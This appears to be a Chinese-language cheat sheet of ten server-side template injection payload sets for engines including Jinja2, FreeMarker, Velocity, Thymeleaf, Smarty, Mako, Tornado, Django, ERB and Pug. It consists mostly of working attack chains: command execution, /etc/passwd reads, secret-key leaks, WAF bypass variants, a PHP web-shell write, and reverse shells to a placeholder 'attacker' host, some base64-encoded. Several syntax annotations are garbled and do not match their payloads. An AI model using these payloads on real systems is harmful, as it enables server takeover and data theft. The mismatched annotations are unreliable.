# SSTI模板注入

_10 条 web payload_

### Jinja2模板注入  `ssti-jinja2`
_Jinja2/Twig模板注入攻击技术_
子类：**Jinja2** · tags: `ssti` `jinja2` `twig` `template`

**前置条件：**
- 使用Jinja2/Twig模板引擎
- 用户输入直接渲染到模板

**攻击链：**

**1. 探测SSTI**
> 探测模板注入
```
{{7*7}}
${7*7}
<%= 7*7 %>
{{config}}
如果输出49或配置信息，则存在SSTI
```
**语法解析：**
- `{{` — Jinja2变量输出语法 _value_
- `7*7` — 数学表达式 _value_
- `}}` — 变量输出结束 _value_

**2. 信息收集**
> 收集环境信息
```
{{config}}
{{self}}
{{request}}
{{"".__class__.__mro__}}
{{"".__class__.__mro__[1].__subclasses__()}}
```
**语法解析：**
- `__class__` — 获取对象的类 _value_
- `__mro__` — 方法解析顺序 _value_
- `__subclasses__` — 获取子类列表 _value_

**3. 命令执行**
> 执行系统命令
```
{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```
**语法解析：**
- `__init__` — 类的初始化方法 _value_
- `__globals__` — 全局命名空间 _value_
- `popen` — 打开管道执行命令 _value_

**4. 反弹Shell**
> 获取反弹Shell
_platform: linux_
```
{{config.__class__.__init__.__globals__['os'].popen('bash -c "bash -i >& /dev/tcp/attacker/4444 0>&1"').read()}}
```
**语法解析：**
- `{{}}` — 模板表达式语法 _technique_
- `__class__` — Python类属性 _keyword_
- `config` — 配置对象 _variable_

**WAF/EDR 绕过变体：**

**字符串拼接**
> 使用字符串拼接绕过
```
{{''['__cla'+'ss__']}}
{{''|attr('__cla'+'ss__')}}
{{''|attr('\x5f\x5fcla\x5f\x5fss')}}
```
**语法解析：**
- `attr()` — Jinja2过滤器获取属性 _function_
- `\x5f` — 下划线的十六进制编码 _value_

**使用request对象**
> 通过request参数传递
```
{{request|attr(request.args.a)}}&a=__class__
{{request|attr(request.args.a)|attr(request.args.b)}}&a=__class__&b=__mro__
```
**语法解析：**
- `{{}}` — 模板表达式语法 _technique_
- `__class__` — Python类属性 _keyword_


**概述：** Jinja2是Python最流行的模板引擎，SSTI漏洞允许攻击者在模板中注入恶意表达式，通过Python的MRO(方法解析顺序)链访问内置类实现远程代码执行，危害极为严重。

**漏洞原理：** Jinja2 SSTI漏洞发生在用户输入被直接嵌入模板字符串(如Template(user_input).render())而非通过安全的变量传递时。攻击者通过{{}}表达式访问Python对象树，利用__mro__/__subclasses__()找到os/subprocess等模块执行系统命令。

**利用方法：** 完整利用流程：
1. 探测模板注入点
2. 识别模板引擎类型
3. 探索类继承链
4. 找到可利用的类
5. 执行系统命令

**防御措施：** 防御措施：
1. 不要将用户输入直接渲染到模板
2. 使用沙箱环境
3. 限制模板功能
4. 输入验证和过滤

---

### FreeMarker模板注入  `ssti-freemarker`
_FreeMarker模板引擎注入攻击技术_
子类：**FreeMarker** · tags: `ssti` `freemarker` `java` `template`

**前置条件：**
- 使用FreeMarker模板引擎
- 用户输入直接渲染到模板

**攻击链：**

**1. 探测SSTI**
> 探测FreeMarker模板注入
```
${7*7}
${"freemarker"}
<#assign ex="freemarker">
如果输出49或freemarker，则存在SSTI
```
**语法解析：**
- `${` — FreeMarker变量输出语法 _variable_
- `7*7` — 数学表达式 _value_
- `}` — 变量输出结束 _value_

**2. 信息收集**
> 收集环境信息
```
${.version}
${.current_template_name}
${.lang}
${system_property["java.version"]}
${system_property["os.name"]}
```
**语法解析：**
- `.version` — FreeMarker版本 _value_
- `system_property` — Java系统属性 _value_

**3. 命令执行 - new**
> 使用Execute类执行命令
```
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("whoami")}
```
**语法解析：**
- `?new()` — 实例化类 _function_
- `Execute` — FreeMarker内置命令执行类 _keyword_

**4. 命令执行 - api**
> 使用ObjectConstructor执行命令
```
<#assign api="freemarker.template.utility.ObjectConstructor"?new()>${api("java.lang.Runtime","getRuntime").exec("id")}
<#assign api="freemarker.template.utility.ObjectConstructor"?new()>${api("java.lang.ProcessBuilder","/bin/sh","-c","id").start()}
```
**语法解析：**
- `<!ENTITY>` — 实体定义 _tag_
- `SYSTEM` — 外部实体 _keyword_
- `file://` — 文件协议 _technique_

**5. 反弹Shell**
> 获取反弹Shell
_platform: linux_
```
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci9QMDBBIA==}|{base64,-d}|{bash,-i}")}
```
**语法解析：**
- `<#assign` — 命令/载荷起始 _command_
- ` ex="freemarker.template.utility.Execute"?new()>${ex("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci9QMDBBIA==}|{base64,-d}|{bash,-i}")}` — 参数与载荷内容 _value_

**WAF/EDR 绕过变体：**

**字符串拼接**
> 使用字符串拼接绕过
```
<#assign ex="freemarker.template.utility.Ex"+"ecute"?new()>${ex("id")}
<#assign cls="java.lang.Ru"+"ntime">${cls?new().exec("id")}
```
**语法解析：**
- `Ex"+"ecute` — 字符串拼接绕过关键字检测 _value_

**使用内置函数**
> 直接实例化执行
```
${"freemarker.template.utility.Execute"?new()("id")}
${"java.lang.Runtime"?new().exec("id")}
```
**语法解析：**
- `EXEC` — 执行存储过程 _keyword_
- `Runtime.exec` — Java命令执行 _function_


**概述：** FreeMarker是Java生态中广泛使用的模板引擎，其SSTI漏洞可通过内置的freemarker.template.utility.Execute类或ObjectConstructor直接执行Java代码和系统命令。

**漏洞原理：** FreeMarker SSTI利用其强大的内置功能：通过<#assign>指令实例化Java类，调用freemarker.template.utility.Execute执行命令，或使用ObjectConstructor/JythonRuntime等内置对象。配置不当时new()内建函数可创建任意Java对象。

**利用方法：** 完整利用流程：
1. 探测模板注入点
2. 确认FreeMarker引擎
3. 使用Execute类执行命令
4. 或使用ObjectConstructor反射调用

**防御措施：** 防御措施：
1. 不要将用户输入直接渲染到模板
2. 配置sandbox
3. 禁用new内置函数
4. 使用安全的模板配置

---

### Velocity模板注入  `ssti-velocity`
_Velocity模板引擎注入攻击技术_
子类：**Velocity** · tags: `ssti` `velocity` `java` `template`

**前置条件：**
- 使用Velocity模板引擎
- 用户输入直接渲染到模板

**攻击链：**

**1. 探测SSTI**
> 探测Velocity模板注入
```
#set($x=7*7)$x
$velocityVersion
$class.inspect("java.lang.Runtime")
如果输出49或版本信息，则存在SSTI
```
**语法解析：**
- `#set` — Velocity变量赋值指令 _value_
- `$x` — 变量引用 _variable_
- `$velocityVersion` — Velocity版本信息 _variable_

**2. 信息收集**
> 收集环境信息
```
$class.inspect("java.lang.System")
$class.inspect("java.lang.Runtime")
$sys.class.forName("java.lang.Runtime")
```
**语法解析：**
- `$class.inspect` — 检查类信息 _variable_
- `java.lang.Runtime` — Java Runtime类 _value_

**3. 命令执行 - ClassTool**
> 使用ClassTool执行命令
```
#set($rt=$class.inspect("java.lang.Runtime"))
#set($chr=$class.inspect("java.lang.Character"))
#set($ex=$rt.getRuntime().exec("id"))
$ex.waitFor()
#set($is=$ex.getInputStream())
#set($br=$class.inspect("java.io.BufferedReader").newInstance($class.inspect("java.io.InputStreamReader").newInstance($is)))
#set($line=$br.readLine())
$line
```
**语法解析：**
- `$class.inspect` — 获取类对象 _variable_
- `getRuntime()` — 获取Runtime实例 _function_
- `exec()` — 执行命令 _function_

**4. 命令执行 - 反射**
> 使用反射执行命令
```
#set($rt=$Class.forName("java.lang.Runtime"))
#set($m=$rt.getDeclaredMethod("getRuntime"))
#set($obj=$m.invoke(null))
#set($ex=$rt.getDeclaredMethod("exec",$Class.forName("java.lang.String")).invoke($obj,"id"))
```
**语法解析：**
- `$Class.forName` — 加载类 _variable_
- `getDeclaredMethod` — 获取方法 _encoding_
- `invoke` — 调用方法 _value_

**5. 反弹Shell**
> 获取反弹Shell
_platform: linux_
```
#set($rt=$Class.forName("java.lang.Runtime"))
#set($m=$rt.getDeclaredMethod("getRuntime"))
#set($obj=$m.invoke(null))
#set($ex=$rt.getDeclaredMethod("exec",$Class.forName("java.lang.String")).invoke($obj,"bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci9QMDBBIA==}|{base64,-d}|{bash,-i}"))
```
**语法解析：**
- `#set($rt=$Class.forName("java.lang.Runtime"))
#set($m=$rt.getDeclaredMethod("getRuntime"))
#set($obj=$m.invoke(null))
#set($ex=$rt.getDeclaredMethod("exec",$Class.forName("java.lang.String")).invoke($obj,"bash` — 命令/载荷起始 _command_
- ` -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci9QMDBBIA==}|{base64,-d}|{bash,-i}"))` — 参数与载荷内容 _value_

**WAF/EDR 绕过变体：**

**字符串拼接**
> 使用字符串拼接绕过
```
#set($cmd="i"+"d")
#set($rt=$Class.forName("java.lang.Ru"+"ntime"))
#set($ex=$rt.getRuntime().exec($cmd))
```
**语法解析：**
- `#set($cmd="i"+"d")
#set($rt=$Class.forName("java.lang.Ru"+"ntime"))
#set($ex=$` — 攻击载荷 _value_

**使用Unicode**
> 使用Unicode编码绕过
```
#set($cmd="id")
#set($rt=$Class.forName("java.lang.Runtime"))
#set($ex=$rt.getRuntime().exec($cmd))
```
**语法解析：**
- `\i\d` — id的Unicode编码 _value_


**概述：** Apache Velocity是Java的轻量级模板引擎，SSTI漏洞可通过反射机制调用Java Runtime类执行系统命令。Velocity在Atlassian产品(Confluence/Jira)中广泛使用，相关漏洞影响面极大。

**漏洞原理：** Velocity SSTI通过#set指令将变量绑定到Java类实例，再通过反射链(Class.forName/getMethod/invoke)访问Runtime.getRuntime().exec()执行命令。Velocity的宏和$引用机制使得构造利用链相对简单。

**利用方法：** 完整利用流程：
1. 探测模板注入点
2. 确认Velocity引擎
3. 使用ClassTool或反射
4. 执行系统命令

**防御措施：** 防御措施：
1. 不要将用户输入直接渲染到模板
2. 禁用ClassTool
3. 使用沙箱环境
4. 限制模板功能

---

### Thymeleaf模板注入  `ssti-thymeleaf`
_Thymeleaf模板引擎注入攻击技术_
子类：**Thymeleaf** · tags: `ssti` `thymeleaf` `java` `spring` `template`

**前置条件：**
- 使用Thymeleaf模板引擎
- Spring框架
- 用户输入直接渲染到模板

**攻击链：**

**1. 探测SSTI**
> 探测Thymeleaf模板注入
```
${7*7}
#{7*7}
*{7*7}
[[${7*7}]]
如果输出49，则存在SSTI
```
**语法解析：**
- `$7*7` — 命令/关键字 _command_

**2. 信息收集**
> 收集环境信息
```
${T(java.lang.System).getenv()}
${T(java.lang.Runtime).getRuntime().exec("id")}
${T(java.lang.Class).forName("java.lang.Runtime")}
```
**语法解析：**
- `T()` — 访问Java类 _function_
- `getenv()` — 获取环境变量 _function_

**3. 命令执行 - Spring表达式**
> 使用Spring表达式执行命令
```
${T(java.lang.Runtime).getRuntime().exec("id")}
${T(java.lang.Runtime).getRuntime().exec("whoami")}
${T(java.lang.ProcessBuilder).newInstance("id").start()}
```
**语法解析：**
- `T(java.lang.Runtime)` — 访问Runtime类 _value_
- `getRuntime()` — 获取Runtime实例 _function_
- `exec()` — 执行命令 _function_

**4. 命令执行 - ProcessBuilder**
> 使用ProcessBuilder执行命令
```
${new java.lang.ProcessBuilder(new String[]{"id"}).start()}
${new java.lang.ProcessBuilder(new String[]{"bash","-c","id"}).start()}
${new java.lang.ProcessBuilder(new String[]{"cmd","/c","whoami"}).start()}
```
**语法解析：**
- `new` — 实例化对象 _value_
- `ProcessBuilder` — Java进程构建器 _value_
- `start()` — 启动进程 _function_

**5. 反弹Shell**
> 获取反弹Shell
_platform: linux_
```
${T(java.lang.Runtime).getRuntime().exec("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci9QMDBBIA==}|{base64,-d}|{bash,-i}")}
```
**语法解析：**
- `EXEC` — 执行存储过程 _keyword_
- `base64` — Base64编码 _encoding_
- `Runtime.exec` — Java命令执行 _function_

**WAF/EDR 绕过变体：**

**字符串拼接**
> 使用字符串拼接绕过
```
${T(java.lang.Run"+"time).getRuntime().exec("i"+"d")}
${T(java.lang.Class).forName("java.lang.Ru"+"ntime").getMethod("getRuntime").invoke(null)}
```
**语法解析：**
- `EXEC` — 执行存储过程 _keyword_
- `Runtime.exec` — Java命令执行 _function_

**使用反射**
> 使用反射绕过
```
${T(Class).forName("java.lang.Runtime").getMethod("exec",T(String)).invoke(T(Runtime).getRuntime(),"id")}
```
**语法解析：**
- `EXEC` — 执行存储过程 _keyword_
- `Runtime.exec` — Java命令执行 _function_

**URL编码**
> 使用字节数组绕过
```
${T(java.lang.Runtime).getRuntime().exec(new String(new byte[]{105,100}))}
# 使用字节数组构造命令
```
**语法解析：**
- `new byte[]{105,100}` — id的ASCII字节 _value_


**概述：** Thymeleaf是Spring Boot默认的模板引擎，其SSTI漏洞常通过Spring表达式语言(SpEL)执行代码。在Spring MVC中，即使不在模板文件中，控制器返回值也可能触发模板解析导致注入。

**漏洞原理：** Thymeleaf SSTI主要通过两种方式触发：1)预处理表达式__${expression}__在模板解析前执行SpEL 2)控制器返回用户可控的视图名触发模板解析。SpEL提供了访问Java类和执行方法的完整能力。

**利用方法：** 完整利用流程：
1. 探测模板注入点
2. 确认Thymeleaf引擎
3. 使用T()访问Java类
4. 执行系统命令

**防御措施：** 防御措施：
1. 不要将用户输入直接渲染到模板
2. 禁用SpEL表达式
3. 使用安全的模板配置
4. 输入验证和过滤

---

### Smarty模板注入  `ssti-smarty`
_Smarty模板引擎注入攻击技术_
子类：**Smarty** · tags: `ssti` `smarty` `php` `template`

**前置条件：**
- 使用Smarty模板引擎
- 用户输入直接渲染到模板

**攻击链：**

**1. 探测SSTI**
> 探测Smarty模板注入
```
{$smarty.version}
{7*7}
{$smarty.template}
如果输出版本或49，则存在SSTI
```
**语法解析：**
- `$smarty.version` — 命令/关键字 _command_

**2. 信息收集**
> 收集环境信息
```
{$smarty.server.PHP_SELF}
{$smarty.server.SERVER_NAME}
{$smarty.const.PHP_VERSION}
```
**语法解析：**
- `$smarty.server` — 服务器变量 _variable_
- `$smarty.const` — PHP常量 _variable_

**3. 命令执行 - system**
> 使用system函数执行命令
```
{system("id")}
{system("whoami")}
{system("cat /etc/passwd")}
```
**语法解析：**
- `system()` — PHP系统命令执行函数 _function_

**4. 命令执行 - passthru**
> 使用passthru函数执行命令
```
{passthru("id")}
{passthru("ls -la")}
{passthru("cat /etc/passwd")}
```
**语法解析：**
- `passthru()` — PHP命令执行函数 _function_

**5. 命令执行 - exec**
> 使用exec函数执行命令
```
{exec("id",$output)}
{foreach from=$output item=line}{$line}{/foreach}
```
**语法解析：**
- `exec()` — PHP命令执行函数 _function_
- `$output` — 输出数组 _variable_

**6. 反弹Shell**
> 获取反弹Shell
_platform: linux_
```
{system("bash -c \"bash -i >& /dev/tcp/attacker/4444 0>&1\"")}
{system("nc -e /bin/sh attacker 4444")}
```
**语法解析：**
- `system()` — 系统命令执行 _function_

**WAF/EDR 绕过变体：**

**字符串拼接**
> 使用字符串拼接绕过
```
{system("i"+"d")}
{system("who"."ami")}
{system("ca"."t /etc/passwd")}
```
**语法解析：**
- `{system("i"+"d")}
{system("who"."ami")}
{system("ca"."t` — 命令/载荷起始 _command_
- ` /etc/passwd")}` — 参数与载荷内容 _value_

**变量赋值**
> 使用变量赋值绕过
```
{assign var="cmd" value="id"}
{system($cmd)}
{assign var="f" value="sys"."tem"}
{$f("id")}
```
**语法解析：**
- `assign` — Smarty变量赋值 _value_
- `value` — 变量值 _value_

**使用PHP函数**
> WAF绕过技术
```
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
{PHP function call}
```
**语法解析：**
- `Smarty_Internal_Write_File::writeFile$SCRIPT_NAME<?php` — 命令/关键字 _command_


**概述：** Smarty是PHP最流行的模板引擎之一，其SSTI漏洞可通过{php}标签(旧版本)或{if}条件中的PHP函数调用实现代码执行，在PHP应用渗透测试中需重点关注。

**漏洞原理：** Smarty SSTI利用方式因版本而异：旧版Smarty(3.x以下)支持{php}{/php}标签直接执行PHP代码；新版Smarty可通过{if}标签中调用system()/passthru()等函数，或使用{Smarty_Internal_Write_File}写入文件。

**利用方法：** 完整利用流程：
1. 探测模板注入点
2. 确认Smarty引擎
3. 使用system/passthru执行命令
4. 获取Shell

**防御措施：** 防御措施：
1. 不要将用户输入直接渲染到模板
2. 禁用PHP函数调用
3. 使用沙箱模式
4. 输入验证和过滤

---

### Mako模板注入  `ssti-mako`
_Mako模板引擎注入攻击技术_
子类：**Mako** · tags: `ssti` `mako` `python` `template`

**前置条件：**
- 使用Mako模板引擎
- 用户输入直接渲染到模板

**攻击链：**

**1. 探测SSTI**
> 探测Mako模板注入
```
${7*7}
${self}
${self.module}
如果输出49或模块信息，则存在SSTI
```
**语法解析：**
- `$7*7` — 命令/关键字 _command_

**2. 信息收集**
> 收集环境信息
```
${self.module.cache.util}
${self.module.cache.util.os}
${dir(self)}
```
**语法解析：**
- `self.module` — 访问模板模块 _value_
- `dir()` — 列出对象属性 _function_

**3. 命令执行 - os模块**
> 使用os模块执行命令
```
${self.module.cache.util.os.popen("id").read()}
${self.module.cache.util.os.popen("whoami").read()}
${self.module.cache.util.os.system("id")}
```
**语法解析：**
- `os.popen()` — 打开管道执行命令 _function_
- `.read()` — 读取输出 _function_

**4. 命令执行 - subprocess**
> 使用subprocess执行命令
```
<%
import subprocess
%>
${subprocess.check_output(["id","-a"])}
${subprocess.Popen(["id"],stdout=subprocess.PIPE).communicate()[0]}
```
**语法解析：**
- `<%` — Mako Python代码块开始 _operator_
- `%>` — 代码块结束 _operator_
- `subprocess` — Python子进程模块 _value_

**5. 反弹Shell**
> 获取反弹Shell
_platform: linux_
```
${self.module.cache.util.os.popen("bash -c \"bash -i >& /dev/tcp/attacker/4444 0>&1\"").read()}
```
**语法解析：**
- `$self.module.cache.util.os.popenbash` — 命令/关键字 _command_

**WAF/EDR 绕过变体：**

**字符串拼接**
> 使用字符串拼接绕过
```
${self.module.cache.util.os.popen("i"+"d").read()}
${self.module.cache.util.os.popen("who"+"ami").read()}
```
**语法解析：**
- `$self.module.cache.util.os.popeni+d.read` — 命令/关键字 _command_

**使用__import__**
> 使用__import__导入模块
```
${__import__("os").popen("id").read()}
${__import__("subprocess").check_output(["id"])}
```
**语法解析：**
- `__import__` — Python内置导入函数 _value_

**使用getattr**
> 使用getattr绕过
```
${getattr(__import__("os"),"popen")("id").read()}
${getattr(getattr(__import__("os"),"popen")("id"),"read")()}
```
**语法解析：**
- `$getattr__import__ospopenid.read` — 命令/关键字 _command_


**概述：** Mako是Python的高性能模板引擎，在Pylons/Pyramid框架中广泛使用。其SSTI漏洞可直接执行Python代码，因为Mako模板本质上会被编译为Python模块，安全边界较弱。

**漏洞原理：** Mako SSTI的危害特别严重：模板中的${expression}直接执行Python表达式，<%块可包含任意Python代码，<%! %>定义模块级Python代码。攻击者无需复杂的利用链即可直接import os并执行系统命令。

**利用方法：** 完整利用流程：
1. 探测模板注入点
2. 确认Mako引擎
3. 通过self.module访问os
4. 执行系统命令

**防御措施：** 防御措施：
1. 不要将用户输入直接渲染到模板
2. 限制模板功能
3. 使用沙箱环境
4. 输入验证和过滤

---

### Tornado模板注入  `ssti-tornado`
_Tornado模板引擎注入攻击技术_
子类：**Tornado** · tags: `ssti` `tornado` `python` `template`

**前置条件：**
- 使用Tornado模板引擎
- 用户输入直接渲染到模板

**攻击链：**

**1. 探测SSTI**
> 探测Tornado模板注入
```
{{7*7}}
{{handler}}
{{request}}
如果输出49或handler对象，则存在SSTI
```
**语法解析：**
- `{{...}}` — 模板表达式 _format_

**2. 信息收集**
> 收集环境信息
```
{{handler.settings}}
{{handler.application}}
{{request.headers}}
{{request.cookies}}
```
**语法解析：**
- `handler.settings` — 应用配置 _value_
- `request.headers` — HTTP头 _value_

**3. 命令执行 - os**
> 使用os模块执行命令
```
{% import os %}
{{os.popen("id").read()}}
{{os.popen("whoami").read()}}
{{os.system("id")}}
```
**语法解析：**
- `system()` — 系统命令执行 _function_
- `{{...}}` — 模板表达式 _format_

**4. 命令执行 - subprocess**
> 使用subprocess执行命令
```
{% import subprocess %}
{{subprocess.check_output(["id","-a"])}}
{{subprocess.Popen(["id"],stdout=-1).communicate()[0]}}
```
**语法解析：**
- `subprocess` — Python子进程模块 _value_
- `check_output` — 获取命令输出 _value_

**5. 反弹Shell**
> 获取反弹Shell
_platform: linux_
```
{% import os %}
{{os.popen("bash -c \"bash -i >& /dev/tcp/attacker/4444 0>&1\"").read()}}
```
**语法解析：**
- `{{...}}` — 模板表达式 _format_

**WAF/EDR 绕过变体：**

**字符串拼接**
> 使用字符串拼接绕过
```
{% import os %}
{{os.popen("i"+"d").read()}}
{{os.popen("who"+"ami").read()}}
```
**语法解析：**
- `{{...}}` — 模板表达式 _format_

**使用__import__**
> 使用__import__导入模块
```
{{__import__("os").popen("id").read()}}
{{__import__("subprocess").check_output(["id"])}}
```
**语法解析：**
- `{{...}}` — 模板表达式 _format_

**使用handler**
> 通过handler访问
```
{{handler.application.settings}}
{{handler.get_status()}}
{{handler.request.remote_ip}}
```
**语法解析：**
- `{{handler.application.settings}}
{{handler.get_status()}}
` — 模板表达式注入 _value_


**概述：** Tornado是Python的异步Web框架兼模板引擎，其SSTI漏洞可通过模板表达式执行Python代码。Tornado模板默认对输出进行HTML转义，但原始表达式{%raw%}和{{!expression}}可绕过。

**漏洞原理：** Tornado模板SSTI通过{{}}表达式执行Python代码。攻击者可利用import语句导入模块，或通过handler对象(Tornado模板中的内置变量)访问application设置、cookie_secret等敏感信息，进而执行任意代码。

**利用方法：** 完整利用流程：
1. 探测模板注入点
2. 确认Tornado引擎
3. 导入os模块
4. 执行系统命令

**防御措施：** 防御措施：
1. 不要将用户输入直接渲染到模板
2. 禁用import语句
3. 使用沙箱环境
4. 输入验证和过滤

---

### Django模板注入  `ssti-django`
_Django模板引擎注入攻击技术_
子类：**Django** · tags: `ssti` `django` `python` `template`

**前置条件：**
- 使用Django模板引擎
- 用户输入直接渲染到模板

**攻击链：**

**1. 探测SSTI**
> 探测Django模板注入
```
{{7*7}}
{% if 1=1 %}vulnerable{% endif %}
{{request}}
如果输出49或request对象，则存在SSTI
```
**语法解析：**
- `{{...}}` — 模板表达式 _format_

**2. 信息收集**
> 收集环境信息
```
{{request.META}}
{{request.user}}
{{request.session}}
{{settings.SECRET_KEY}}
```
**语法解析：**
- `request.META` — HTTP元数据 _value_
- `request.user` — 当前用户 _value_
- `settings` — Django配置 _value_

**3. 命令执行 - 通过settings**
> 尝试通过settings访问
```
{{settings.TEMPLATES}}
{{settings.DATABASES}}
# Django模板默认沙箱，难以直接执行命令
# 需要找到可利用的对象链
```
**语法解析：**
- `{{...}}` — 模板表达式 _format_

**4. 命令执行 - 对象链**
> 通过对象链访问
```
{{request.user.groups.model._meta.apps}}
{{request.user.user_permissions.model._meta.apps}}
# 尝试访问Django内部对象
```
**语法解析：**
- `_meta` — Django模型元数据 _value_
- `apps` — 应用注册表 _value_

**5. 敏感信息泄露**
> 泄露敏感配置
```
{{settings.SECRET_KEY}}
{{settings.DATABASES}}
{{settings.ALLOWED_HOSTS}}
{{settings.DEBUG}}
```
**语法解析：**
- `{{}}` — 模板表达式 _technique_
- `os` — 系统模块 _keyword_

**WAF/EDR 绕过变体：**

**使用过滤器**
> 使用Django过滤器
```
{{request|length}}
{{settings.SECRET_KEY|default:""}}
{{request.META|dictsort:"key"}}
```
**语法解析：**
- `|length` — 长度过滤器 _value_
- `|default` — 默认值过滤器 _value_

**使用for循环**
> 使用for循环遍历
```
{% for key, value in request.META.items %}{{key}}:{{value}}{% endfor %}
{% for k in settings.keys %}{{k}}{% endfor %}
```
**语法解析：**
- `{{...}}` — 模板表达式 _format_


**概述：** Django模板引擎设计时就考虑了安全性，不支持直接执行Python代码。但在特定配置下(如DEBUG模式、自定义模板标签)仍可能存在SSTI漏洞，通过访问对象属性链泄露敏感信息。

**漏洞原理：** Django SSTI虽然无法直接RCE，但可通过对象属性遍历泄露敏感信息：{{settings.SECRET_KEY}}获取密钥、{{settings.DATABASES}}获取数据库配置、通过已注册的模板变量(如request对象)访问HTTP头和session数据。

**利用方法：** 完整利用流程：
1. 探测模板注入点
2. 确认Django引擎
3. 访问request/settings
4. 泄露敏感配置
5. 结合其他漏洞利用

**防御措施：** 防御措施：
1. 不要将用户输入直接渲染到模板
2. 禁用settings访问
3. 使用autoescape
4. 输入验证和过滤

---

### ERB模板注入  `ssti-erb`
_ERB(Ruby)模板引擎注入攻击技术_
子类：**ERB** · tags: `ssti` `erb` `ruby` `template`

**前置条件：**
- 使用ERB模板引擎
- 用户输入直接渲染到模板

**攻击链：**

**1. 探测SSTI**
> 探测ERB模板注入
```
<%= 7*7 %>
<%= self %>
<%= __FILE__ %>
如果输出49或文件信息，则存在SSTI
```
**语法解析：**
- `<%=` — ERB输出表达式 _operator_
- `7*7` — 数学表达式 _value_
- `%>` — 表达式结束 _operator_

**2. 信息收集**
> 收集环境信息
```
<%= Dir.pwd %>
<%= ENV.inspect %>
<%= `id` %>
<%= File.read("/etc/passwd") %>
```
**语法解析：**
- `Dir.pwd` — 当前目录 _value_
- `ENV` — 环境变量 _value_
- ``id`` — 反引号执行命令 _value_

**3. 命令执行 - 反引号**
> 使用反引号执行命令
```
<%= `id` %>
<%= `whoami` %>
<%= `cat /etc/passwd` %>
<%= `ls -la` %>
```
**语法解析：**
- ``` — Ruby反引号执行系统命令 _value_

**4. 命令执行 - system**
> 使用system/exec执行命令并获取反弹Shell
_platform: linux_
```
<%= system("id") %>
<%= system("whoami") %>
<%= exec("id") %>
<%= IO.popen("id").read %>
```
**语法解析：**
- `EXEC` — 执行存储过程 _keyword_
- `system()` — 系统命令执行 _function_

**WAF/EDR 绕过变体：**

**字符串拼接**
> 使用字符串拼接绕过
```
<%= `i` + `d` %>
<%= system("wh"+"oami") %>
<%= ("i"+"d").then { |c| system(c) } %>
```
**语法解析：**
- `<%= `i` + `d` %>
<%= system("wh"+"oami") %>
<%= ("i"+"d").` — 模板表达式注入 _value_

**使用%语法**
> 使用%x语法执行命令
```
<%= %x(id) %>
<%= %x{whoami} %>
<%= %x[cat /etc/passwd] %>
```
**语法解析：**
- `%x()` — Ruby命令执行语法 _function_

**使用Open3**
> 使用Open3模块
```
<%= require "open3"; Open3.popen3("id") { |i,o,e,t| puts o.read } %>
```
**语法解析：**
- `<%=` — 命令/关键字 _command_


**概述：** ERB(Embedded Ruby)是Ruby标准库的模板引擎，在Ruby on Rails中广泛使用。ERB SSTI可直接执行Ruby代码，通过system()/exec()/反引号等方式执行系统命令，利用难度较低。

**漏洞原理：** ERB SSTI通过<%= %>标签执行Ruby表达式，<% %>标签执行Ruby语句。攻击者可直接调用system()/exec()/IO.popen()/反引号执行系统命令，或通过File类读写服务器文件，利用链极为简单直接。

**利用方法：** 完整利用流程：
1. 探测模板注入点
2. 确认ERB引擎
3. 使用反引号执行命令
4. 获取Shell

**防御措施：** 防御措施：
1. 不要将用户输入直接渲染到模板
2. 使用安全的模板引擎
3. 限制模板功能
4. 输入验证和过滤

---

### Pug/Jade模板注入  `ssti-pug`
_Pug/Jade模板引擎注入攻击技术_
子类：**Pug** · tags: `ssti` `pug` `jade` `nodejs` `template`

**前置条件：**
- 使用Pug/Jade模板引擎
- 用户输入直接渲染到模板

**攻击链：**

**1. 探测SSTI**
> 探测Pug模板注入
```
#{7*7}
#{this}
#{global}
如果输出49或global对象，则存在SSTI
```
**语法解析：**
- `#{` — Pug插值语法 _value_
- `7*7` — 数学表达式 _value_
- `}` — 插值结束 _value_

**2. 信息收集**
> 收集环境信息
```
#{process}
#{process.env}
#{global.process}
#{require}
```
**语法解析：**
- `process` — Node.js进程对象 _value_
- `process.env` — 环境变量 _path_
- `global` — 全局对象 _value_

**3. 命令执行 - child_process**
> 使用child_process执行命令
```
- var exec = require("child_process").exec
#{exec("id", function(err, stdout, stderr) { console.log(stdout) })}
- require("child_process").exec("id")
```
**语法解析：**
- `-` — Pug JavaScript代码行 _operator_
- `require` — Node.js模块加载 _value_
- `child_process` — 子进程模块 _value_

**4. 命令执行 - execSync**
> 使用execSync执行命令
```
- var execSync = require("child_process").execSync
#{execSync("id").toString()}
#{require("child_process").execSync("id").toString()}
```
**语法解析：**
- `execSync` — 同步执行命令 _value_
- `toString()` — Buffer转字符串 _function_

**5. 反弹Shell**
> 获取反弹Shell
_platform: linux_
```
- require("child_process").exec("bash -c \"bash -i >& /dev/tcp/attacker/4444 0>&1\"")
```
**语法解析：**
- `EXEC` — 执行存储过程 _keyword_

**WAF/EDR 绕过变体：**

**字符串拼接**
> 使用字符串拼接绕过
```
- var cmd = "i" + "d"
#{require("child_process").execSync(cmd).toString()}
- var r = "require"
#{global[r]("child_process")}
```

**使用global**
> 使用global对象
```
#{global.process.mainModule.require("child_process").execSync("id").toString()}
#{global["req"+"uire"]("child_process")}
```
**语法解析：**
- `mainModule` — Node.js主模块 _value_
- `require` — 模块加载函数 _value_

**使用this**
> 使用this.constructor
```
#{this.constructor.constructor("return process")().mainModule.require("child_process").execSync("id")}
```
**语法解析：**
- `#this.constructor.constructorreturn` — 命令/关键字 _command_


**概述：** Pug(原Jade)是Node.js生态最流行的模板引擎，其SSTI漏洞可通过JavaScript代码注入直接访问Node.js运行时环境，利用require()或child_process模块执行系统命令。

